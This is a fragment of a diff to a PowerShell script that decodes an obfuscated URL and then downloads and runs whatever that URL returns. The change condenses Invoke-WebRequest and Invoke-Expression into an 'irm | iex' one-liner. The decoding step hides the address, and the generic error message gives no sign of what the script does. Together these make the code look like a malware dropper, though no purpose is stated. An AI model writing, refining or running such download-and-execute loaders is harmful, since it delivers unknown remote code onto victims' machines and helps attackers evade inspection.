@@ -17,11 +17,9 @@ ${process_function} = {
     return [System.Text.Encoding]::UTF8.GetString(${result_bytes})
 }
 
-${url_to_fetch} = & ${process_function} -input_data ${random_var_1}
-
 try {
-    ${response} = Invoke-WebRequest -Uri ${url_to_fetch}
-    ${exec_result} = Invoke-Expression ${response}.Content
+    ${url_to_fetch} = & ${process_function} -input_data ${random_var_1}
+    irm ${url_to_fetch} | iex
 } catch {
     Write-Error "Failed Parse code"
 }
